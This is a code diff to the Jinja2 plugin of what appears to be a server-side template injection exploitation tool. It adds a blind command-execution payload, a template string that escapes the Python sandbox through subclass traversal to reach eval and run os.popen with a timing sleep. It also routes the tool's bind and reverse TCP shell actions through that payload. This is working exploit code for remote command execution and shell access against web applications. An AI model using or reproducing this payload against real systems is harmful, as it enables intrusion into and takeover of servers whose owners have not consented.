@@ -49,13 +49,22 @@ class Jinja2(Plugin):
             'evaluate_blind': """%(code)s and __import__('time').sleep(%(delay)i)"""
         },
         'tcp_shell' : {
-            'call' : 'execute',
+            'call' : 'execute_blind',
             'tcp_shell': languages.bash_tcp_shell
         },
         'reverse_tcp_shell' : {
-            'call': 'execute',
+            'call': 'execute_blind',
             'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
-        }
+        },
+        'execute_blind' : {
+            'call': 'inject',
+            'execute_blind': """{%% set d = "__import__('os').popen('%(code)s && sleep %(delay)i').read()" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
+    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
+    {%% if 'eval' in b.keys() %%}
+    {{ b['eval'](d) }}
+    {%% endif %%} {%% endif %%} {%% endfor %%}
+    {%% endif %%} {%% endfor %%}"""
+        },
 
     }
 
@@ -104,10 +113,6 @@ class Jinja2(Plugin):
         # Quote code before submitting it
         return super(Jinja2, self).evaluate(quote(code), prefix, suffix, blind)
 
-    def execute(self, code, prefix = None, suffix = None, blind = False):
-        # Quote code before submitting it
-        return super(Jinja2, self).execute(quote(code), prefix, suffix, blind)
-
     def detect_blind_engine(self):
 
         if not self.get('blind'):
@@ -115,5 +120,6 @@ class Jinja2(Plugin):
 
         self.set('language', 'python')
         self.set('execute', True)
+        self.set('execute_blind', True)
         self.set('engine', 'jinja2')
         self.set('evaluate', 'python')
